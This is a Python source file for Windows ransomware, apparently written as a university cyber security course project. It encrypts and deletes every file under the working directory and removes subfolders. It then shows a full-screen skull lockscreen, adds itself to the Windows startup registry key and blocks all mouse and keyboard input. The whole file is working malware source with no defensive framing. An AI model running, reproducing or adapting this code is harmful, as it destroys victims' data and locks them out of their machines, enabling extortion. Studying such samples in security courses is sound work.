import shutil
import os, inspect, var, json, base64
import pyHook 
from RSAMain import RSAEncryption
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding, hashes, hmac, serialization
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.asymmetric import rsa, padding as rsa_padding
from tkinter import *
from winreg import *

'''
 You got totally
 ~ HAXXX0RD ~
 by:
 Brian Powell @BriianPowell
 Mina Messiha @MinaMessiha109
 CECS 378 - Cyber Security
 Aliasgari
'''

class Infector:
    def encryptDir(self):
        currentDir = os.getcwd()
        
        # Fetch a list of all files within the root directory
        for root, dirs, files in os.walk(currentDir):
            for file in files:
                if file not in var.EXCLUSIONS:
                    # Encrypting each files in the list of files
                    # For file in filesList:
                    RSACipher, CT, IV, TAG, EXT = RSAEncryption().encryptRSA(root, os.path.join(root, file))
                    rsa2ascii = base64.encodebytes(RSACipher).decode('ascii')
                    ct2ascii = base64.encodebytes(CT).decode('ascii')
                    iv2ascii = base64.encodebytes(IV).decode('ascii')
                    tag2ascii = base64.encodebytes(TAG).decode('ascii')
                    
                    jData = json.dumps({'RSACipher': rsa2ascii, 'CT': ct2ascii, 'IV': iv2ascii, 'TAG': tag2ascii, 'EXT': EXT})

                    # Writing encryption data to JSON file
                    with open(os.path.join(root, 'ripLul.json'), 'a') as jFile:    
                        jFile.write(jData)
                    os.remove(os.path.join(root,file))
                    
            for dir in dirs:
                shutil.rmtree(os.path.join(root, dir), ignore_errors=True)


def scriptinfo():
    for teil in inspect.stack():
        if teil[1].startswith("<"):
            continue
        if teil[1].upper().startswith(sys.exec_prefix.upper()):
            continue
        trc = teil[1]
        
    if getattr(sys, 'frozen', False):
        scriptdir, scriptname = os.path.split(sys.executable)
        directory = scriptdir + "\\" + scriptname
        return directory

    scriptdir, trc = os.path.split(trc)

    if not scriptdir:
        scriptdir = os.getcwd()

    directory = scriptdir + "/" + trc
    return directory

def main():
    Infector().encryptDir()

if __name__ == '__main__':
    main()

# Creating a tkinter window instance
root = Tk()

# Setting tkinter window size to fullscreen
root.geometry("{0}x{1}+0+0".format(root.winfo_screenwidth(), root.winfo_screenheight()))

# Removes window frame
root.overrideredirect(True)

# Hides mouse cursor
root.config(cursor="none")

# Configuring font, font color, and background
root.configure(background='black')
skull = Label(root, text=var.LOGO)
skull.config(font=("fixedsys", 17))
skull.config(background="black")
skull.config(foreground="#66FF00")
skull.grid(column=0, row=0)
root.columnconfigure(0, weight=1)
root.rowconfigure(0, weight=1)

# Edits registry to remove task manager option
keyVal = r'Software\Microsoft\Windows\CurrentVersion\Policies\System'
try:
    key = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
except:
    key = CreateKey(HKEY_CURRENT_USER, keyVal)
SetValueEx(key, "DisableTaskMgr", 0, REG_DWORD, 0)   

# Edits registry to add script to startup
keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
try:
    key = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
except:
    key = CreateKey(HKEY_CURRENT_USER, keyVal)
SetValueEx(key, "RRWOS", 0, REG_SZ, scriptinfo())   

# Locking mouse and keyboard input
def lockInput(event):
    return False

hm = pyHook.HookManager()
hm.MouseAll = lockInput
hm.KeyAll = lockInput
hm.HookMouse()
hm.HookKeyboard()

mainloop()